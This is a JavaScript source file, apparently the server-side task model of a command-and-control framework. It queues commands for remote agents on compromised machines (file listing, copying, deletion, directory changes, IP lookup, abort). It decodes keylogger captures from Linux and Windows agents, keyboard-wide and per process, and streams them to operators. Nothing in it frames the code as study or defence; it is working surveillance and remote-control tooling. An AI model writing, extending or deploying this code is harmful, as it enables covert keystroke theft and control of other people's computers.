/**
 * @file Tasks model
 * @author Umar Abdul
 */

import crypto from 'crypto';
import mongoose from 'mongoose';
import Agent, {getAgent} from './agent.js';
import {logStatus, logWarning, logError} from './log.js';

// For storing functions to execute after a task was completed by an agent.
const taskCallbacks = {};

const taskSchema = mongoose.Schema({
  uid: {
    type: String,
    required: true,
  },
  owner: {
    type: String,
    required: true
  },
  agentID: {
    type: String,
    required: true
  },
  taskType: {
    type: String,
    required: true
  },
  data: {
    type: Object,
  },
  dateCreated: {
    type: Number,
    required: true
  },
  received: {
    type: Boolean,
    required: true,
    default: false
  },
  dateReceived: {
    type: Number
  },
  completed: {
    type: Boolean,
    required: true,
    default: false
  },
  successful: {
    type: Boolean,
    required: true,
    default: false
  },
  dateCompleted: {
    type: Number
  },
  result: {
    type: String
  }
});

const Task = mongoose.model('task', taskSchema);
export default Task;

/**
 * Create a new task. Emits "new_task" ws event on success.
 * @param {string} owner - The task owner (username of the user that creates the task)
 * @param {object} data - The task data (agentID, taskType, and data)
 * @param {onComplete} function - An async function to call after the tasks has been completed. Takes 2 arguments; the agent, and the task. If defined, this will be called before saving the updated task and agent object to the database and emitting the 'update_task' and 'update_agent' WS events.
 * @return {object} The task created, null on error.
 */
export const createTask = async (owner, data, onComplete) => {

  const socketServer = global.socketServer;
  const taskID = crypto.randomBytes(8).toString('hex').trim();
  let agentID = data.agentID.toString().trim();
  const agent = await getAgent(agentID); // will throw an error in not valid.
  if (agent.aborted)
    return null;
  const taskType = data.taskType.toString().trim();
  const task = new Task({
    uid: taskID,
    owner,
    agentID: agent.uid,
    taskType,
    data: data.data,
    dateCreated: Date.now()
  });
  await task.save();
  if (task.taskType === "abort"){
    agent.aborted = true;
    await agent.save();
    socketServer.emit("update_agent", agent);
  }
  logStatus(`Task '${task.uid}' created for agent '${task.agentID}' by user '${task.owner}'`);
  if (onComplete)
    taskCallbacks[task.uid] = onComplete;
  socketServer.emit("new_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    prompt: global.serverPrompt,
    msg: `Task '${task.uid}' (${taskType}) created by '${task.owner}'`
  });

  return task;
};

/**
 * Delete an existing task. Emits "task_deleted" ws event on success.
 * @param {string} agentID - The ID of the agent.
 * @param {string} taskID - The ID of the task.
 * @param {string} username - The username of the user that request the action.
 * @return {object} The query result.
 */
export const deleteTask = async (agentID, taskID, username) => {

  const socketServer = global.socketServer;
  agentID = agentID.toString();
  taskID = taskID.toString();
  const data = await Task.deleteOne({uid: taskID, agentID});
  if (data.deletedCount === 0){
    socketServer.emit("agent_console_output", {
      agentID,
      prompt: global.serverPrompt,
      msg:`Invalid task: ${taskID}`
    });
    throw new Error("Invalid task!");
  }
  logWarning(`Task '${taskID}' deleted for agent '${agentID}' by user '${username}'`);
  socketServer.emit("task_deleted", {
    taskID,
    agentID,
    user: username
  });
  socketServer.emit("agent_console_output", {
    agentID,
    prompt: global.serverPrompt,
    msg: `Task '${taskID}' deleted by '${username}'`
  });
  return data;
};

/**
 * Delete all tasks for an agent.
 * This method does not emit any ws event as it is to be used only when deleting an agent,
 * and the "agent_deleted" event generated by the `deleteAgent` method of the agent model should take care of it.
 * @param {string} agentID - ID of the target agent.
 * @return {object} The query result.
 */
export const deleteAllTasks = async (agentID) => {
  return (await Task.deleteMany({agentID: agentID.toString()}));
};

/**
 * Get all tasks for the agent with the given ID.
 * It DOES NOT update the state of the task.
 * @param {string} agentID - A unique identifier for the agent.
 * @return {object} Available tasks. 
 */
export const getTasks = async (agentID) => {
  return await Task.find({agentID: agentID.toString()});
};

/**
 * Get all pending tasks (tasks that were never sent to the agent) for the agent with the given ID.
 * This is used by the agents, so we need to filter out what we send.
 * It DOES NOT update the state of the task.
 * @param {string} agentID - A unique identifier for the agent.
 * @return {object} Pending tasks. 
 */
export const getPendingTasks = async (agentID) => {
  
  const agent = await getAgent(agentID);
  if (agent.frozen)
    return [];
  return await Task.find({agentID: agentID.toString(), received: false}, ["uid", "taskType", "data"]);
};

/**
 * Get all the tasks available for all agents. This should only be accessible to authenticated users.
 * @return {object} All available tasks.
 */
export const getAllTasks = async () => {

  const allTasks = {};
  const agents = await Agent.find({});
  for (let agent of agents)
    allTasks[agent.uid] = [];
  const data = await Task.find({});
  for (let task of data){
    if (allTasks[task.agentID] !== undefined)
      allTasks[task.agentID].unshift(task);
  }
  return allTasks;
};

/**
 * Mark a task as received. Emits the "update_task" ws event on success.
 * @param {string} taskID - The ID of the task.
 * @return {object} The target task, null if invalid.
 */
export const markReceived = async (taskID) => {
  
  const socketServer = global.socketServer;
  const task = await Task.findOne({uid: taskID.toString()});
  if (!task)
    return null;
  task.received = true;
  task.dateReceived = Date.now();
  await task.save();
  socketServer.emit("update_task", task);
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    prompt: global.serverPrompt,
    msg: `Task '${task.uid}' (${task.taskType}) received by agent`
  });
  return task;
};

/**
 * Set the result of a task and mark it as complete. Emits the "update_task" event on success.
 * @param {string} agentID - The ID of the agent.
 * @param {object} result - The result data.
 */
export const setResult = async (agentID, data) => {

  agentID = agentID.toString();
  let taskID = data.uid.toString();
  let successful = parseInt(data.successful) === 1;
  let result = data.result;
  if (!result)
    result = "";
  result = result.toString();
  const socketServer = global.socketServer;
  const agent = await getAgent(agentID);
  const task = await Task.findOne({uid: taskID.toString(), completed: false});
  if (!task)
    throw new Error("Invalid task!");
  task.completed = true;
  task.successful = successful;
  task.dateCompleted = Date.now();
  task.result = "";
  if (task.taskType === "keymon" && agent.os === "linux"){
    // Parse main keyboard dumps.
    let keys = data["main-kbd"];
    if (keys){
      task.result += "-".repeat(10) + " Main Keyboard " + "-".repeat(10) + "\n";
      if (agent.os === "linux"){
        let mapping = {};
        mapping[1] = "[ESC]";
        for (let i = 2; i < 11; i++)
          mapping[i] = `${i - 1}`;
        mapping[11] = "0";
        mapping[12] = "-";
        mapping[13] = "=";
        mapping[14] = "[BACKSPACE]";
        mapping[15] = "[TAB]";
        mapping[16] = "q";
        mapping[17] = "w";
        mapping[18] = "e";
        mapping[19] = "r";
        mapping[20] = "t";
        mapping[21] = "y";
        mapping[22] = "u";
        mapping[23] = "i";
        mapping[24] = "o";
        mapping[25] = "p";
        mapping[26] = "[";
        mapping[27] = "]";
        mapping[28] = "[ENTER]";
        mapping[29] = "[L-CTRL]";
        mapping[30] = "a";
        mapping[31] = "s";
        mapping[32] = "d";
        mapping[33] = "f";
        mapping[34] = "g";
        mapping[35] = "h";
        mapping[36] = "j";
        mapping[37] = "k";
        mapping[38] = "l";
        mapping[39] = ";";
        mapping[40] = "'";
        mapping[41] = "`";
        mapping[42] = "[L-SHIFT]";
        mapping[43] = "\\";
        mapping[44] = "z";
        mapping[45] = "x";
        mapping[46] = "c";
        mapping[47] = "v";
        mapping[48] = "b";
        mapping[49] = "n";
        mapping[50] = "m";
        mapping[51] = ",";
        mapping[52] = ".";
        mapping[53] = "/";
        mapping[54] = "[R-SHIFT]";
        mapping[56] = "[L-ALT]";
        mapping[57] = "[SPACE]";
        mapping[58] = "[CAPSLOCK]";
        for (let i = 59; i < 69; i++)
          mapping[i] = `F${i - 58}`;
        mapping[69] = "[NUM-LOCK]";
        mapping[70] = "[SCROLL-LOCK]";
        mapping[87] = "F11";
        mapping[88] = "F12";
        mapping[100] = "[R-ALT]";
        mapping[101] = "[LINEFEED]";
        mapping[102] = "[HOME]";
        mapping[103] = "[UP]";
        mapping[104] = "[PG-UP]";
        mapping[105] = "[LEFT]";
        mapping[106] = "[RIGHT]";
        mapping[107] = "[END]";
        mapping[108] = "[DOWN]";
        mapping[109] = "[PG-DOWN]";
        mapping[110] = "[INSERT]";
        for (let i = 0; i < keys.length && i < global.KEYMON_MAX_KEYS; i++){
          let val = mapping[parseInt(keys[i])];
          if (!val)
            val = keys[i].toString();
          task.result += val + " ";
        }    
      }else{        
        for (let i = 0; i < keys.length; i++)
          task.result += `${keys[i]} `;
      }
      task.result += "\n\n";
    }
    // Parse process dumps.
    for (let k in data){
      if (!isNaN(k)){
        let pid = parseInt(k);
        let codes = data[k];
        if (codes.length == 0)
          continue;
        result = "-".repeat(10) + " proc " + pid.toString() + " " + "-".repeat(10) + "\n";
        for (let code of codes){
          if (code == 10 || code == 13)
            result += "[ENTER] ";
          else if (code == 0x7f)
            result += "[BACKSPACE] ";
          else if (code <= 31 || code >= 127)
            result += `0x${code.toString(16).padStart(2, '0')} `;
          else
            result += `${String.fromCharCode(code)} `;
        }
        result += "\n\n";
        task.result += result;
      }
    }
  }else if (task.taskType === "keymon" && agent.os === "windows"){
    if (data["main-kbd"]){
      let mapping = {};
      mapping[3] = "[CTRL-C]";
      mapping[8] = "[BACKSPACE]";
      mapping[9] = "[TAB]";
      mapping[12] = "[CLEAR]"
      mapping[13] = "[ENTER]";
      mapping[16] = "[SHIFT]";
      mapping[17] = "[CTRL]";
      mapping[18] = "[ALT]";
      mapping[19] = "[PAUSE]";
      mapping[20] = "[CAPSLOCK]";
      mapping[0x1B] = "[ESC]";
      mapping[32] = "[SPACE]";
      mapping[33] = "[PAGEUP]"
      mapping[34] = "[PAGEDOWN]";
      mapping[35] = "[END]";
      mapping[36] = "[HOME]";
      mapping[37] = "[LEFT]";
      mapping[38] = "[UP]";
      mapping[39] = "[RIGHT]";
      mapping[40] = "[DOWN]";
      mapping[41] = "[SELECT]";
      mapping[42] = "[PRINT]";
      mapping[43] = "[EXEC]";
      mapping[44] = "[PRTSC]";
      mapping[45] = "[INS]";
      mapping[46] = "[DEL]";
      mapping[47] = "[HELP]";
      mapping[0x5B] = "[L-WIN]";
      mapping[0x5C] = "[R-WIN]";
      mapping[0x5F] = "[SLEEP]";
      for (let i = 0x70; i <= 0x87; i++)
        mapping[i] = `F${i - 0x6F}`;
      for (let i = 0x60; i <= 0x69; i++)
        mapping[i] = `${i - 0x60}`;
      mapping[0x90] = "[NUMLOCK]";
      mapping[0x91] = "[SCROLL]";
      mapping[0xA0] = "[L-SHIFT]";
      mapping[0xA1] = "[R-SHIFT]";
      mapping[0xA2] = "[L-CTRL]";
      mapping[0xA3] = "[R-CTRL]";
      mapping[0xA4] = "[L-MENU]";
      mapping[0xA5] = "[R-MENU]";
      mapping[0xAD] = "[MUTE]";
      mapping[0xAE] = "[VOL-DOWN]";
      mapping[0xAF] = "[VOL-UP]";
      mapping[0xFE] = "[CLEAR]";
      for (let i = 0; i < data["main-kbd"].length && i < global.KEYMON_MAX_KEYS; i++){
        let input = data["main-kbd"][i];
        let caps = (input & 0x8000) != 0 ? true : false;
        let shift = (input & 0x4000) != 0 ? true : false;
        let code = input & 0xff;
        let val = "";
        if (code >= 0x41 && code <= 0x5A){ // A - Z
          if (caps && shift)
            code += 32; // switch to lower case
          else if (caps == false && shift == false)
            code += 32; // switch to lower case
          val = String.fromCharCode(code);
        }else if (mapping[code]){ // Valid mapping
          val = mapping[code];
        }else{
          if (code == 0x30) val = shift ? ')' : '0';
          else if (code == 0x31) val = shift ? '!' : '1';
          else if (code == 0x32) val = shift ? '@' : '2';
          else if (code == 0x33) val = shift ? '#' : '3';
          else if (code == 0x34) val = shift ? '$' : '4';
          else if (code == 0x35) val = shift ? '%' : '5';
          else if (code == 0x36) val = shift ? '^' : '6';
          else if (code == 0x37) val = shift ? '&' : '7';
          else if (code == 0x38) val = shift ? '*' : '8';
          else if (code == 0x39) val = shift ? '(' : '9';
          else if (code == 0xBA) val = shift ? ':' : ';';
          else if (code == 0xBB) val = shift ? '+' : '=';
          else if (code == 0xBC) val = shift ? '<' : ',';
          else if (code == 0xBD) val = shift ? '_' : '-';
          else if (code == 0xBE) val = shift ? '>' : '.';
          else if (code == 0xBF) val = shift ? '?' : '/';
          else if (code == 0xC0) val = shift ? '~' : '`';
          else if (code == 0xDB) val = shift ? '{' : '[';
          else if (code == 0xDC) val = shift ? '|' : '\\';
          else if (code == 0xDD) val = shift ? '}' : ']';
          else if (code == 0xDE) val = shift ? '"' : "'";
          else if (code >= 32 && code <= 126) // Printable ASCII
            val = String.fromCharCode(code);
          else
            val = `0x${code.toString(16).padStart(2, '0').toUpperCase()}`;
        }
        task.result += `${val} `;
      }
    }
  }else if (task.taskType === "cd" && task.successful){
    task.data.dir = result;
    task.result = "Changed working directory: " + result;
  }else if (task.taskType === "ipinfo" && task.successful){
    task.result = JSON.stringify(JSON.parse(result), null, 2);
  }else if (task.taskType === "ls" && task.successful){
    const entries = JSON.parse(result);
    entries.sort((x, y) => x[2].localeCompare(y[2]));
    for (let i = 0; i < entries.length; i++){
      const entry = entries[i];
      task.result += ` ${entry[1].toString().padStart(10, " ")} | ${entry[0] === 0 ? 'F' : 'D'} | ${entry[2]}\n`
    }
    if (entries.length === 0)
      task.result = "Empty directory: " + task.data.dir;
  }else if (task.taskType === "del"){
    task.result = `${result} file(s) deleted!`;
  }else if (task.taskType === "cp" && task.successful){
    task.result = `${result} byte(s) copied!`;
  }else{
    // Cleanup trailing newlines.
    result = result.toString().replace(/\r\n+$/, "");
    result = result.replace(/\n+$/, "");
    task.result = result;
  }
  if (!task.result){
    if (result)
      task.result = result;
  }
  const onComplete = taskCallbacks[task.uid];
  if (onComplete){
    await onComplete(agent, task);
    delete taskCallbacks[task.uid];
  }
  await task.save();
  await agent.save();
  socketServer.emit("update_task", task);
  socketServer.emit("update_agent", agent);
  let message = `Task '${task.uid}' (${task.taskType}) completed`
  if (task.result.length > 0)
    message += `. ${task.result.length} bytes received;\n${task.result}`
  socketServer.emit("agent_console_output", {
    agentID: task.agentID,
    prompt: global.serverPrompt,
    msg: message
  });
  logStatus(`Task '${task.uid}' completed!`);
  return task;
};
